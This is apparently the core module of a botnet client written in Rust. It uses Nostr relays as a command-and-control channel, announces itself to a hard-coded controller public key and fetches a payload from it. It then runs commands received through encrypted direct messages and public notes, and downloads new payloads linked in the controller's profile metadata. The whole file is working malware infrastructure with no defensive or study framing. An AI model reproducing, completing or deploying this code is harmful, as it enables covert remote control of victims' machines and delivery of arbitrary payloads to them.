use std::{
    collections::HashMap,
    io::Write,
    path::{Path, PathBuf},
    process::Command,
};

use nostr_sdk::prelude::*;
use reqwest::header::{CONTENT_TYPE, HeaderValue};
use tempfile::TempPath;
use uuid::Uuid;

pub mod state;

use state::State;

use crate::{
    CNC_PUB_KEY, ENCRYPTION_KEY,
    command::Commands,
    encryption::decrypt,
    session::{Session, SessionProps},
};

const ARCH: &'static str = std::env::consts::ARCH;

pub struct Config {
    pub name: Option<String>,
    pub display_name: Option<String>,
    pub seed: Option<String>,
    pub private_key: Option<String>,
    pub relays: Vec<String>,
}

pub struct Bot {
    state: State,
    session: Session,
}

impl Bot {
    pub fn create(config: Config) -> Self {
        let name = match config.name {
            Some(name) => name,
            None => format!("bot-{}", Uuid::new_v4()),
        };

        let display_name = match config.display_name {
            Some(display) => display,
            None => format!("bot-{}", Uuid::new_v4()),
        };

        let state = State::default();

        let session = Session::create(SessionProps {
            name,
            display_name,
            relays: config.relays,
            private_key: config.private_key,
            seed: config.seed,
        });

        Self { state, session }
    }

    pub async fn run(&mut self) -> Result<()> {
        println!("[i] Connecting to relays");

        self.session.init().await?;

        self.session
            .update_metadata(self.state.to_string().as_str())
            .await?;

        self.session
            .send_msg("bot activated", PublicKey::parse(CNC_PUB_KEY).unwrap())
            .await?;

        let pubkey = PublicKey::parse(CNC_PUB_KEY).unwrap();
        self.state.payload = self.session.get_payload(pubkey).await?;
        println!("path: {:?}", self.state.payload);
        let mut msg_stream = self.session.receive_msgs(pubkey).await?;
        let mut notes_stream = self.session.subscribe_notes(pubkey).await?;
        let mut metadata_stream = self.session.subscribe_metadata(pubkey).await?;

        let mut streams = None;

        let mut prev_owner = self.state.owner;
        loop {
            let owner_pubkey = self.state.owner;
            if prev_owner != owner_pubkey {
                if let Some(owner_pubkey) = owner_pubkey {
                    let owner_msg_stream = self.session.receive_msgs(owner_pubkey).await?;
                    let owner_notes_stream = self.session.subscribe_notes(owner_pubkey).await?;
                    streams = Some((owner_msg_stream, owner_notes_stream));
                } else {
                    streams = None;
                }
                prev_owner = owner_pubkey;
            }
            if let Some((ref mut owner_msg_stream, ref mut owner_notes_stream)) = streams {
                let owner_pubkey = self.state.owner.unwrap();
                tokio::select! {
                    Some(owner_msg) = owner_msg_stream.next() => {
                        Self::handle_command(&self.session, &mut self.state, &owner_msg.as_str(), owner_pubkey).await?;
                    },
                    Some(owner_event) = owner_notes_stream.next() => {
                        Self::handle_note(&self.session, &mut self.state, &owner_event.content, owner_pubkey).await?;
                    },
                    Some(msg) = msg_stream.next() => {
                        Self::handle_command(&self.session, &mut self.state, &msg.as_str(), pubkey).await?;
                    },
                    Some(event) = notes_stream.next() => {
                        Self::handle_note(&self.session, &mut self.state, &event.content, pubkey).await?;
                    },
                    Some(metadata) = metadata_stream.next() => {
                        Self::handle_metadata(&self.session, &mut self.state, metadata).await?;
                    },
                    else => {}
                }
            } else {
                tokio::select! {
                    Some(msg) = msg_stream.next() => {
                        Self::handle_command(&self.session, &mut self.state, &msg.as_str(), pubkey).await?;
                    },
                    Some(event) = notes_stream.next() => {
                        Self::handle_note(&self.session, &mut self.state, &event.content, pubkey).await?;
                    },
                    Some(metadata) = metadata_stream.next() => {
                        Self::handle_metadata(&self.session, &mut self.state, metadata).await?;
                    },
                    else => {
                    }
                }
            }
        }
    }

    async fn handle_command(
        session: &Session,
        state: &mut State,
        msg: &str,
        pubkey: PublicKey,
    ) -> Result<()> {
        if let Some(cmd) = Commands::parse(msg) {
            cmd.execute(state, &session, pubkey).await?;
        } else {
            let error_msg = format!("This command was not detected {}", msg);
            session.send_msg(error_msg.as_str(), pubkey).await?;
        }
        Ok(())
    }

    async fn handle_note(
        session: &Session,
        state: &mut State,
        msg: &str,
        pubkey: PublicKey,
    ) -> Result<()> {
        if let Some(cmd) = Commands::parse(msg) {
            cmd.execute(state, session, pubkey).await?;
        }
        Ok(())
    }

    async fn handle_metadata(
        session: &Session,
        state: &mut State,
        metadata: Metadata,
    ) -> Result<()> {
        println!("metadata: {:?}", metadata);
        if let Some(path) = session.download_payload_from_metadata(metadata).await? {
            println!("Setting payload: {:?}", path);
            state.payload = Some(path);
        }
        Ok(())
    }
}
